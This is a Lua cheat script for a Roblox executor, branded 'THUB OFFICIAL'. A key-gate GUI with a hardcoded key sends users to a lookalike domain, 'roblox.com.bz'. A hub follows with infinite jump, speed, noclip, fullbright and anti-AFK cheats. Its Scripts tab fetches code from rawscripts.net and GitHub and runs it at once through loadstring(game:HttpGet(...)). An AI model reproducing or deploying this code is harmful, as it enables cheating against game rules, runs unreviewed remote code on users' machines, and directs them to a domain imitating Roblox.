--========================================================--
--                 THUB OFFICIAL KEY SYSTEM               --
--========================================================--

local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")

pcall(function()
	game.CoreGui:FindFirstChild("THUB_KEYSYSTEM"):Destroy()
end)

local CorrectKey = "THUB2026"
local KeyPassed = false

-- CHANGE THIS LINK

local KeyLink = "https://roblox.com.bz/communities/520850900/"

-- GUI

local KeyGui = Instance.new("ScreenGui")
KeyGui.Name = "THUB_KEYSYSTEM"
KeyGui.Parent = game.CoreGui
KeyGui.ResetOnSpawn = false

-- BLUR

local Blur = Instance.new("BlurEffect")
Blur.Parent = Lighting
Blur.Size = 15

-- MAIN

local KeyMain = Instance.new("Frame")
KeyMain.Parent = KeyGui
KeyMain.Size = UDim2.new(0,430,0,300)
KeyMain.Position = UDim2.new(0.5,-215,0.5,-150)
KeyMain.BackgroundColor3 = Color3.fromRGB(15,15,15)
KeyMain.BorderSizePixel = 0
KeyMain.Active = true

Instance.new("UICorner",KeyMain).CornerRadius = UDim.new(0,20)

local Stroke = Instance.new("UIStroke")
Stroke.Parent = KeyMain
Stroke.Color = Color3.fromRGB(60,60,60)

-- TOPBAR

local Topbar = Instance.new("Frame")
Topbar.Parent = KeyMain
Topbar.Size = UDim2.new(1,0,0,45)
Topbar.BackgroundColor3 = Color3.fromRGB(20,20,20)
Topbar.BorderSizePixel = 0

Instance.new("UICorner",Topbar).CornerRadius = UDim.new(0,20)

local Fix = Instance.new("Frame")
Fix.Parent = Topbar
Fix.Size = UDim2.new(1,0,0,20)
Fix.Position = UDim2.new(0,0,1,-20)
Fix.BackgroundColor3 = Color3.fromRGB(20,20,20)
Fix.BorderSizePixel = 0

-- TITLE

local Title = Instance.new("TextLabel")
Title.Parent = Topbar
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(1,0,1,0)
Title.Font = Enum.Font.GothamBold
Title.Text = "THUB OFFICIAL"
Title.TextColor3 = Color3.new(1,1,1)
Title.TextSize = 24

-- SUBTITLE

local Subtitle = Instance.new("TextLabel")
Subtitle.Parent = KeyMain
Subtitle.BackgroundTransparency = 1
Subtitle.Position = UDim2.new(0,0,0,60)
Subtitle.Size = UDim2.new(1,0,0,30)
Subtitle.Font = Enum.Font.Gotham
Subtitle.Text = "Premium Access Key System"
Subtitle.TextColor3 = Color3.fromRGB(180,180,180)
Subtitle.TextSize = 15

-- INPUT BOX

local KeyBox = Instance.new("TextBox")
KeyBox.Parent = KeyMain
KeyBox.Size = UDim2.new(0,340,0,45)
KeyBox.Position = UDim2.new(0.5,-170,0,105)
KeyBox.BackgroundColor3 = Color3.fromRGB(22,22,22)
KeyBox.PlaceholderText = "Enter Key..."
KeyBox.Text = ""
KeyBox.Font = Enum.Font.GothamSemibold
KeyBox.TextColor3 = Color3.new(1,1,1)
KeyBox.PlaceholderColor3 = Color3.fromRGB(120,120,120)
KeyBox.TextSize = 16
KeyBox.BorderSizePixel = 0

Instance.new("UICorner",KeyBox).CornerRadius = UDim.new(0,12)

-- COPY LINK BUTTON

local CopyButton = Instance.new("TextButton")
CopyButton.Parent = KeyMain
CopyButton.Size = UDim2.new(0,165,0,40)
CopyButton.Position = UDim2.new(0.5,-170,0,170)
CopyButton.BackgroundColor3 = Color3.fromRGB(35,35,35)
CopyButton.Text = "JOIN MY COMMUNITY"
CopyButton.Font = Enum.Font.GothamBold
CopyButton.TextColor3 = Color3.new(1,1,1)
CopyButton.TextSize = 15
CopyButton.BorderSizePixel = 0

Instance.new("UICorner",CopyButton).CornerRadius = UDim.new(0,10)

-- GET KEY BUTTON

local GetKey = Instance.new("TextButton")
GetKey.Parent = KeyMain
GetKey.Size = UDim2.new(0,165,0,40)
GetKey.Position = UDim2.new(0.5,5,0,170)
GetKey.BackgroundColor3 = Color3.fromRGB(0,120,255)
GetKey.Text = "GET KEY"
GetKey.Font = Enum.Font.GothamBold
GetKey.TextColor3 = Color3.new(1,1,1)
GetKey.TextSize = 15
GetKey.BorderSizePixel = 0

Instance.new("UICorner",GetKey).CornerRadius = UDim.new(0,10)

-- CHECK BUTTON

local Check = Instance.new("TextButton")
Check.Parent = KeyMain
Check.Size = UDim2.new(0,340,0,45)
Check.Position = UDim2.new(0.5,-170,0,220)
Check.BackgroundColor3 = Color3.fromRGB(0,170,127)
Check.Text = "UNLOCK"
Check.Font = Enum.Font.GothamBold
Check.TextColor3 = Color3.new(1,1,1)
Check.TextSize = 17
Check.BorderSizePixel = 0

Instance.new("UICorner",Check).CornerRadius = UDim.new(0,12)

-- STATUS

local Status = Instance.new("TextLabel")
Status.Parent = KeyMain
Status.BackgroundTransparency = 1
Status.Position = UDim2.new(0,0,1,-25)
Status.Size = UDim2.new(1,0,0,20)
Status.Font = Enum.Font.Gotham
Status.Text = ""
Status.TextColor3 = Color3.fromRGB(255,80,80)
Status.TextSize = 14

-- COPY LINK

CopyButton.MouseButton1Click:Connect(function()

	if setclipboard then

		setclipboard(KeyLink)

		Status.TextColor3 = Color3.fromRGB(0,255,127)
		Status.Text = "Link Copied"

	else

		Status.TextColor3 = Color3.fromRGB(255,80,80)
		Status.Text = "Clipboard Unsupported"
	end
end)

-- GET KEY

GetKey.MouseButton1Click:Connect(function()

	Status.TextColor3 = Color3.fromRGB(0,170,255)
	Status.Text = "Open Link In Browser"

	if syn and syn.request then

		syn.request({
			Url = KeyLink,
			Method = "GET"
		})
	end
end)

-- CHECK KEY

Check.MouseButton1Click:Connect(function()

	if KeyBox.Text == CorrectKey then

		KeyPassed = true

		Status.TextColor3 = Color3.fromRGB(0,255,127)
		Status.Text = "Access Granted"

		wait(1)

		KeyGui:Destroy()
		Blur:Destroy()

		print("THUB LOADED")

	else

		Status.TextColor3 = Color3.fromRGB(255,80,80)
		Status.Text = "Invalid Key"

		TweenService:Create(
			KeyMain,
			TweenInfo.new(0.08),
			{Position = KeyMain.Position + UDim2.new(0,-8,0,0)}
		):Play()

		wait(0.08)

		TweenService:Create(
			KeyMain,
			TweenInfo.new(0.08),
			{Position = UDim2.new(0.5,-215,0.5,-150)}
		):Play()
	end
end)

-- DRAG SYSTEM

local UIS = game:GetService("UserInputService")

local dragging
local dragInput
local dragStart
local startPos

local function update(input)

	local delta = input.Position - dragStart

	KeyMain.Position = UDim2.new(
		startPos.X.Scale,
		startPos.X.Offset + delta.X,
		startPos.Y.Scale,
		startPos.Y.Offset + delta.Y
	)
end

Topbar.InputBegan:Connect(function(input)

	if input.UserInputType == Enum.UserInputType.MouseButton1
	or input.UserInputType == Enum.UserInputType.Touch then

		dragging = true
		dragStart = input.Position
		startPos = KeyMain.Position

		input.Changed:Connect(function()

			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

Topbar.InputChanged:Connect(function(input)

	if input.UserInputType == Enum.UserInputType.MouseMovement
	or input.UserInputType == Enum.UserInputType.Touch then

		dragInput = input
	end
end)

UIS.InputChanged:Connect(function(input)

	if input == dragInput and dragging then
		update(input)
	end
end)

repeat task.wait() until KeyPassed

--========================================================--
--                     MAIN HUB                           --
--========================================================--

local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local TeleportService = game:GetService("TeleportService")
local TweenService = game:GetService("TweenService")

local Player = Players.LocalPlayer

pcall(function()
	game.CoreGui:FindFirstChild("THubOfficial"):Destroy()
end)

-- GUI

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "THubOfficial"
ScreenGui.Parent = game.CoreGui
ScreenGui.ResetOnSpawn = false

-- MAIN

local Main = Instance.new("Frame")
Main.Parent = ScreenGui
Main.Size = UDim2.new(0,600,0,360)
Main.Position = UDim2.new(0.5,-300,0.5,-180)
Main.BackgroundColor3 = Color3.fromRGB(15,15,15)
Main.BorderSizePixel = 0
Main.Active = true

Instance.new("UICorner",Main).CornerRadius = UDim.new(0,20)

local Stroke = Instance.new("UIStroke",Main)
Stroke.Color = Color3.fromRGB(60,60,60)

-- TOPBAR

local Topbar = Instance.new("Frame")
Topbar.Parent = Main
Topbar.Size = UDim2.new(1,0,0,45)
Topbar.BackgroundColor3 = Color3.fromRGB(22,22,22)
Topbar.BorderSizePixel = 0

Instance.new("UICorner",Topbar).CornerRadius = UDim.new(0,20)

local Fix = Instance.new("Frame")
Fix.Parent = Topbar
Fix.Size = UDim2.new(1,0,0,20)
Fix.Position = UDim2.new(0,0,1,-20)
Fix.BackgroundColor3 = Color3.fromRGB(22,22,22)
Fix.BorderSizePixel = 0

local Title = Instance.new("TextLabel")
Title.Parent = Topbar
Title.BackgroundTransparency = 1
Title.Position = UDim2.new(0,15,0,0)
Title.Size = UDim2.new(0,250,1,0)
Title.Font = Enum.Font.GothamBold
Title.Text = "THUB OFFICIAL"
Title.TextColor3 = Color3.new(1,1,1)
Title.TextSize = 22
Title.TextXAlignment = Enum.TextXAlignment.Left

-- MINIMIZE

local Minimize = Instance.new("TextButton")
Minimize.Parent = Topbar
Minimize.Size = UDim2.new(0,30,0,30)
Minimize.Position = UDim2.new(1,-40,0.5,-15)
Minimize.BackgroundColor3 = Color3.fromRGB(35,35,35)
Minimize.Text = "-"
Minimize.Font = Enum.Font.GothamBold
Minimize.TextColor3 = Color3.new(1,1,1)
Minimize.TextSize = 20
Minimize.BorderSizePixel = 0

Instance.new("UICorner",Minimize).CornerRadius = UDim.new(1,0)

-- OPEN BUTTON

local OpenButton = Instance.new("TextButton")
OpenButton.Parent = ScreenGui
OpenButton.Size = UDim2.new(0,55,0,55)
OpenButton.Position = UDim2.new(0,20,0.5,0)
OpenButton.BackgroundColor3 = Color3.fromRGB(15,15,15)
OpenButton.Text = "T"
OpenButton.TextColor3 = Color3.new(1,1,1)
OpenButton.Font = Enum.Font.GothamBold
OpenButton.TextSize = 24
OpenButton.Visible = false
OpenButton.BorderSizePixel = 0

Instance.new("UICorner",OpenButton).CornerRadius = UDim.new(1,0)

-- SIDEBAR

local Sidebar = Instance.new("Frame")
Sidebar.Parent = Main
Sidebar.Position = UDim2.new(0,0,0,45)
Sidebar.Size = UDim2.new(0,150,1,-45)
Sidebar.BackgroundColor3 = Color3.fromRGB(20,20,20)
Sidebar.BorderSizePixel = 0

local TabsLayout = Instance.new("UIListLayout")
TabsLayout.Parent = Sidebar
TabsLayout.Padding = UDim.new(0,8)

local TabsPadding = Instance.new("UIPadding")
TabsPadding.Parent = Sidebar
TabsPadding.PaddingTop = UDim.new(0,15)
TabsPadding.PaddingLeft = UDim.new(0,10)

-- CONTENT HOLDER

local ContentHolder = Instance.new("Frame")
ContentHolder.Parent = Main
ContentHolder.Position = UDim2.new(0,160,0,55)
ContentHolder.Size = UDim2.new(1,-170,1,-65)
ContentHolder.BackgroundTransparency = 1

-- TAB SYSTEM

local Tabs = {}
local CurrentTab

local function CreateTab(name)

	local Button = Instance.new("TextButton")
	Button.Parent = Sidebar
	Button.Size = UDim2.new(1,-20,0,40)
	Button.BackgroundColor3 = Color3.fromRGB(30,30,30)
	Button.Text = name
	Button.Font = Enum.Font.GothamBold
	Button.TextColor3 = Color3.new(1,1,1)
	Button.TextSize = 15
	Button.BorderSizePixel = 0

	Instance.new("UICorner",Button).CornerRadius = UDim.new(0,12)

	local Frame = Instance.new("ScrollingFrame")
	Frame.Parent = ContentHolder
	Frame.Size = UDim2.new(1,0,1,0)
	Frame.Visible = false
	Frame.BackgroundTransparency = 1
	Frame.ScrollBarThickness = 3
	Frame.CanvasSize = UDim2.new(0,0,0,600)
	Frame.BorderSizePixel = 0

	local Layout = Instance.new("UIListLayout")
	Layout.Parent = Frame
	Layout.Padding = UDim.new(0,10)

	local Padding = Instance.new("UIPadding")
	Padding.Parent = Frame
	Padding.PaddingTop = UDim.new(0,5)

	Button.MouseButton1Click:Connect(function()

		for _,tab in pairs(Tabs) do
			tab.Visible = false
		end

		Frame.Visible = true
		CurrentTab = Frame
	end)

	table.insert(Tabs,Frame)

	if not CurrentTab then
		Frame.Visible = true
		CurrentTab = Frame
	end

	return Frame
end

local function CreateToggle(parent,text,callback)

	local Holder = Instance.new("Frame")
	Holder.Parent = parent
	Holder.Size = UDim2.new(1,-10,0,50)
	Holder.BackgroundColor3 = Color3.fromRGB(25,25,25)
	Holder.BorderSizePixel = 0

	Instance.new("UICorner",Holder).CornerRadius = UDim.new(0,12)

	local Label = Instance.new("TextLabel")
	Label.Parent = Holder
	Label.BackgroundTransparency = 1
	Label.Position = UDim2.new(0,15,0,0)
	Label.Size = UDim2.new(0.6,0,1,0)
	Label.Font = Enum.Font.GothamSemibold
	Label.Text = text
	Label.TextColor3 = Color3.new(1,1,1)
	Label.TextSize = 15
	Label.TextXAlignment = Enum.TextXAlignment.Left

	local Toggle = Instance.new("TextButton")
	Toggle.Parent = Holder
	Toggle.Size = UDim2.new(0,70,0,30)
	Toggle.Position = UDim2.new(1,-85,0.5,-15)
	Toggle.BackgroundColor3 = Color3.fromRGB(170,0,0)
	Toggle.Text = "OFF"
	Toggle.Font = Enum.Font.GothamBold
	Toggle.TextColor3 = Color3.new(1,1,1)
	Toggle.TextSize = 14
	Toggle.BorderSizePixel = 0

	Instance.new("UICorner",Toggle).CornerRadius = UDim.new(1,0)

	local Enabled = false

	Toggle.MouseButton1Click:Connect(function()

		Enabled = not Enabled

		if Enabled then
			Toggle.Text = "ON"
			Toggle.BackgroundColor3 = Color3.fromRGB(0,170,0)
		else
			Toggle.Text = "OFF"
			Toggle.BackgroundColor3 = Color3.fromRGB(170,0,0)
		end

		callback(Enabled)
	end)
end

local function CreateButton(parent,text,callback)

	local Button = Instance.new("TextButton")
	Button.Parent = parent
	Button.Size = UDim2.new(1,-10,0,50)
	Button.BackgroundColor3 = Color3.fromRGB(30,30,30)
	Button.Text = text
	Button.Font = Enum.Font.GothamBold
	Button.TextColor3 = Color3.new(1,1,1)
	Button.TextSize = 15
	Button.BorderSizePixel = 0

	Instance.new("UICorner",Button).CornerRadius = UDim.new(0,12)

	Button.MouseButton1Click:Connect(function()
		pcall(callback)
	end)
end

local function CreateLoading(text)

	local Loading = Instance.new("Frame")
	Loading.Parent = ScreenGui
	Loading.Size = UDim2.new(1,0,1,0)
	Loading.BackgroundColor3 = Color3.fromRGB(0,0,0)
	Loading.BackgroundTransparency = 0.35
	Loading.ZIndex = 999

	local Box = Instance.new("Frame")
	Box.Parent = Loading
	Box.Size = UDim2.new(0,260,0,120)
	Box.Position = UDim2.new(0.5,-130,0.5,-60)
	Box.BackgroundColor3 = Color3.fromRGB(18,18,18)
	Box.BorderSizePixel = 0
	Box.ZIndex = 1000

	Instance.new("UICorner",Box).CornerRadius = UDim.new(0,18)

	local Stroke = Instance.new("UIStroke")
	Stroke.Parent = Box
	Stroke.Color = Color3.fromRGB(70,70,70)

	local Title = Instance.new("TextLabel")
	Title.Parent = Box
	Title.BackgroundTransparency = 1
	Title.Size = UDim2.new(1,0,0,40)
	Title.Position = UDim2.new(0,0,0,10)
	Title.Font = Enum.Font.GothamBold
	Title.Text = text
	Title.TextColor3 = Color3.new(1,1,1)
	Title.TextSize = 18
	Title.ZIndex = 1001

	local Status = Instance.new("TextLabel")
	Status.Parent = Box
	Status.BackgroundTransparency = 1
	Status.Size = UDim2.new(1,0,0,25)
	Status.Position = UDim2.new(0,0,0,45)
	Status.Font = Enum.Font.Gotham
	Status.Text = "Loading Script..."
	Status.TextColor3 = Color3.fromRGB(180,180,180)
	Status.TextSize = 14
	Status.ZIndex = 1001

	local BarBack = Instance.new("Frame")
	BarBack.Parent = Box
	BarBack.Size = UDim2.new(0,210,0,10)
	BarBack.Position = UDim2.new(0.5,-105,0,82)
	BarBack.BackgroundColor3 = Color3.fromRGB(35,35,35)
	BarBack.BorderSizePixel = 0
	BarBack.ZIndex = 1001

	Instance.new("UICorner",BarBack).CornerRadius = UDim.new(1,0)

	local Bar = Instance.new("Frame")
	Bar.Parent = BarBack
	Bar.Size = UDim2.new(0,0,1,0)
	Bar.BackgroundColor3 = Color3.fromRGB(0,170,255)
	Bar.BorderSizePixel = 0
	Bar.ZIndex = 1002

	Instance.new("UICorner",Bar).CornerRadius = UDim.new(1,0)

	TweenService:Create(
		Bar,
		TweenInfo.new(2,Enum.EasingStyle.Quad),
		{Size = UDim2.new(1,0,1,0)}
	):Play()

	task.wait(2)

	Loading:Destroy()
end

-- TABS

local MainTab = CreateTab("Main")
local PlayerTab = CreateTab("Player")
local VisualTab = CreateTab("Visual")
local MiscTab = CreateTab("Misc")
local ScriptTab = CreateTab("Scripts")

-- FEATURES

-- Infinite Jump

local InfiniteJump = false

CreateToggle(MainTab,"Infinite Jump",function(v)
	InfiniteJump = v
end)

UIS.JumpRequest:Connect(function()

	if InfiniteJump then

		local Character = Player.Character

		if Character and Character:FindFirstChildOfClass("Humanoid") then
			Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
		end
	end
end)

-- WalkSpeed

CreateToggle(PlayerTab,"WalkSpeed 50",function(v)

	local Character = Player.Character

	if Character and Character:FindFirstChildOfClass("Humanoid") then

		if v then
			Character:FindFirstChildOfClass("Humanoid").WalkSpeed = 50
		else
			Character:FindFirstChildOfClass("Humanoid").WalkSpeed = 16
		end
	end
end)

-- Noclip

local Noclip = false

CreateToggle(PlayerTab,"Noclip",function(v)
	Noclip = v
end)

RunService.Stepped:Connect(function()

	if Noclip and Player.Character then

		for _,part in pairs(Player.Character:GetDescendants()) do

			if part:IsA("BasePart") then
				part.CanCollide = false
			end
		end
	end
end)

-- FullBright

local OldBrightness = Lighting.Brightness

CreateToggle(VisualTab,"FullBright",function(v)

	if v then
		Lighting.Brightness = 5
		Lighting.ClockTime = 12
		Lighting.FogEnd = 100000
	else
		Lighting.Brightness = OldBrightness
	end
end)

-- Anti AFK

CreateToggle(MiscTab,"Anti AFK",function(v)

	if v then

		local VirtualUser = game:GetService("VirtualUser")

		Player.Idled:Connect(function()

			VirtualUser:CaptureController()
			VirtualUser:ClickButton2(Vector2.new())
		end)
	end
end)

-- Rejoin

local Rejoin = Instance.new("TextButton")
Rejoin.Parent = MiscTab
Rejoin.Size = UDim2.new(1,-10,0,50)
Rejoin.BackgroundColor3 = Color3.fromRGB(35,35,35)
Rejoin.Text = "Rejoin Server"
Rejoin.Font = Enum.Font.GothamBold
Rejoin.TextColor3 = Color3.new(1,1,1)
Rejoin.TextSize = 15
Rejoin.BorderSizePixel = 0

Instance.new("UICorner",Rejoin).CornerRadius = UDim.new(0,12)

Rejoin.MouseButton1Click:Connect(function()
	TeleportService:Teleport(game.PlaceId,Player)
end)

-- HIDE/SHOW

Minimize.MouseButton1Click:Connect(function()
	Main.Visible = false
	OpenButton.Visible = true
end)

OpenButton.MouseButton1Click:Connect(function()
	Main.Visible = true
	OpenButton.Visible = false
end)

-- DRAG MAIN

local dragging = false
local dragInput
local dragStart
local startPos

local function update(input)

	local delta = input.Position - dragStart

	Main.Position = UDim2.new(
		startPos.X.Scale,
		startPos.X.Offset + delta.X,
		startPos.Y.Scale,
		startPos.Y.Offset + delta.Y
	)
end

Topbar.InputBegan:Connect(function(input)

	if input.UserInputType == Enum.UserInputType.MouseButton1
	or input.UserInputType == Enum.UserInputType.Touch then

		dragging = true
		dragStart = input.Position
		startPos = Main.Position

		input.Changed:Connect(function()

			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

Topbar.InputChanged:Connect(function(input)

	if input.UserInputType == Enum.UserInputType.MouseMovement
	or input.UserInputType == Enum.UserInputType.Touch then

		dragInput = input
	end
end)

UIS.InputChanged:Connect(function(input)

	if input == dragInput and dragging then
		update(input)
	end
end)

-- DRAG OPEN BUTTON

local dragging2 = false
local dragInput2
local dragStart2
local startPos2

local function update2(input)

	local delta = input.Position - dragStart2

	OpenButton.Position = UDim2.new(
		startPos2.X.Scale,
		startPos2.X.Offset + delta.X,
		startPos2.Y.Scale,
		startPos2.Y.Offset + delta.Y
	)
end

OpenButton.InputBegan:Connect(function(input)

	if input.UserInputType == Enum.UserInputType.MouseButton1
	or input.UserInputType == Enum.UserInputType.Touch then

		dragging2 = true
		dragStart2 = input.Position
		startPos2 = OpenButton.Position

		input.Changed:Connect(function()

			if input.UserInputState == Enum.UserInputState.End then
				dragging2 = false
			end
		end)
	end
end)

OpenButton.InputChanged:Connect(function(input)

	if input.UserInputType == Enum.UserInputType.MouseMovement
	or input.UserInputType == Enum.UserInputType.Touch then

		dragInput2 = input
	end
end)

UIS.InputChanged:Connect(function(input)

	if input == dragInput2 and dragging2 then
		update2(input)
	end
end)

--========================================================--
--                    SCRIPT TAB                          --
--========================================================--

CreateButton(ScriptTab,"BeFlash For Brainrot",function()

	CreateLoading("Loading Be Flash For Brainrot")

	loadstring(game:HttpGet("https://rawscripts.net/raw/Infinity-Be-Flash-For-Brainrots!-Auto-farm-keyless-Cyraa-Hub-215449"))()

end)

CreateButton(ScriptTab,"Infinite Yield",function()

    CreateLoading("Loading infiniteyield")
    
	loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()

end)

CreateButton(ScriptTab,"Dex Explorer",function()

     CreateLoading("Loading Dex Explorer")

	loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()

end)
